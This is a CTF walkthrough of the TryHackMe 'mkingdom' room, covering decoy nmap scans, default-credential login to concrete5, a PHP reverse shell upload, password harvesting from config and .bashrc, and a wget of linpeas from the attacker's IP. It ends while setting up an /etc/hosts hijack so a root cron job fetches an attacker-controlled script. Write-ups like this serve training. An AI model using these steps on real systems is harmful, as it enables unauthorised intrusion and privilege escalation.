![intro](https://github.com/user-attachments/assets/352398d3-7036-426f-8735-18b607e1f22e)

# tryhackme-CTF-writeup-for-mkingdom

This is a walkthrough for the tryhackme CTF mkingdom. I will not provide any flags or passwords as this is intended to be used as a guide.

## Scanning/Reconnaissance

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -A -v $ip -D RND:10 -oN nmap.txt
```

Command break down:

-A: This flag enables aggressive scanning. It combines various scan types (like OS detection, version detection, script scanning, and traceroute) into a single scan.

-v: increases verbosity, providing more detailed output during the scan.

—$ip: provides the target IP we stored as the variable $ip.

-D RND:10 Nmap can send additional packets to confuse network intrusion detection systems (IDS) or hide the true source of the scan by randomly selecting up to 10 decoy IP addresses.

-oN nmap.txt: This option specifies normal output that should be saved to a file named “nmap.txt.

This scan reveals a webserver on port 85:

![nmap](https://github.com/user-attachments/assets/6e9260bd-2c0f-4f72-ae61-0feece3a008a)

Visiting this webserver we see this image of Bowser:

![bowser](https://github.com/user-attachments/assets/5027b68b-1510-432f-8e82-b2b9824a84b5)

Using exiftool on the image reveals that the creater is b0ws53r. 

![exif](https://github.com/user-attachments/assets/6a372813-6216-499a-ad9f-8851eb1d1d98)

Let's run a gobuster and nikto scan on the target:

![gobuster + nikto](https://github.com/user-attachments/assets/52b6696d-72fa-4069-a95e-885787ab9668)

The scans reveal a directory call /app. At first this brings us to a button called jump, and after clicking it a few times, it takes us to toad's expensive website. Let's examine the source code:

![source](https://github.com/user-attachments/assets/5ad9209e-80cc-43d8-9c73-90a87896a060)

The code reveals that the site is using concrete5 8.5.2. I did a little research on exploited this and came across this article on hackerone.com:

![concrete exploit](https://github.com/user-attachments/assets/5d16a8c7-a37d-4bd8-89a7-c5f03afb8414)

I tried a some typical default username and password combos and admin:password worked for the login. Now, we're going to follow the steps described in the hackerone article to change file properties to allow php, and upload a php reverse shell. 
And we now have a reverse shell as www-data!

![www-data](https://github.com/user-attachments/assets/d8d732b3-4ee2-4e56-82e9-45ce03d92f6f)

# Privilege Escalation
I then searched around the home directory but permission is denied for the directories. So, I headed back to www-data's home, and started looking around for useful files. We saw from the source code earlier that the web server is built off of the /app/castle/application. I then found the directory config. It's always a good idea to check the config directory to see if there is senitive info. And the file database.php contains a password for toad.

![su toad](https://github.com/user-attachments/assets/b40596f7-8cfd-43f0-8a4e-dbe45cf34f3f)

I ran sudo -l as toad but toad can't run sudo on this machine. Let's head to /home/toad and see what we can find. smb.txt contains a message from mario:

![smb txt](https://github.com/user-attachments/assets/7d4d89b6-9751-4d8e-8e88-6182f2c6e284)

It's always a good idea to check files such as .bash_history and .bashrc to look for senitive info. I checked out .bashrc and noticed a PWD_token that appears to be base64 encryped.

![bashrc](https://github.com/user-attachments/assets/8515dba8-aebf-456d-83b2-680b1b3952ec)

I was then used this password to su mario:

![su mario](https://github.com/user-attachments/assets/ede5ede8-50dd-48e7-98ca-234218844851)

Now, let's head to /tmp, and run linpeas. I ran a python server from kali:
```bash
python3 -m http.server
```
And wget from mario:
```bash
wget http://<your IP>:8000/linpeas.sh
```bash
chmod +x linpeas.sh
```
```bash
./linpeas.sh >> output
```

I didn't many concrete things that we could use, other some files that we have access to, like the /etc/hosts file. 

# Exploitation
Let's use pspy to see if we can find processes to exploit:

![pspy64](https://github.com/user-attachments/assets/db94d3b3-e0b9-4ccb-ad6d-3d1a76525d1d)

This process looks like something we can exploit:

![pspy counter sh](https://github.com/user-attachments/assets/824d5ffd-a36a-494e-b15f-d8b8d9ca57d7)

This command starts by downloading the script (counter.sh) from a (mkindom.thm:85).
The downloaded script is then passed to bash for execution.
The output produced by the script execution is appended to the log file located at /var/log/up.log.
This type of command, which downloads and executes a script from the internet without verification, can be very dangerous. As we saw earlier, we have access to /etc/hosts, se we can pontenially execute malicious code. 

First, let's check out that /etc/hosts file:

![etc_hosts](https://github.com/user-attachments/assets/5fb19660-513b-40ae-8711-197105da5953)

The next file to check out is the script in the process command counter.sh:

![counter sh_up log](https://github.com/user-attachments/assets/e9c5459d-3986-4fa8-9a6c-e64e733fd637)

So we don't have write access to counter.sh or up.log. But what we can do, is modify the /etc/hosts file to change the IP of mkingdom.thm:85 to point to our IP. This way, we can make our own counter.sh script and trick the target into executing, as root. So, once the target executes the script, it should give us a reverse shell as root.

The first step will be to modify the /etc/hosts file to point to our IP. I found the easiest way to do this is copy the contents of the /etc/host file onto kali, because using nano and editing the file on the target was finicky and hard to see what I was doing, change the mkingdom IP to ours, and copy the contents back into the targets /etc/hosts file.
The modified /etc/hosts file should look like this except with the mkingdom IP pointing to the IP of your attack box:

![modified _etc_hosts](https://github.com/user-attachments/assets/2e6104b5-5c7b-4551-8bd0-f86e186fc22c)

Next, on our attack box, create a script replicating counter.sh complete with the file path:

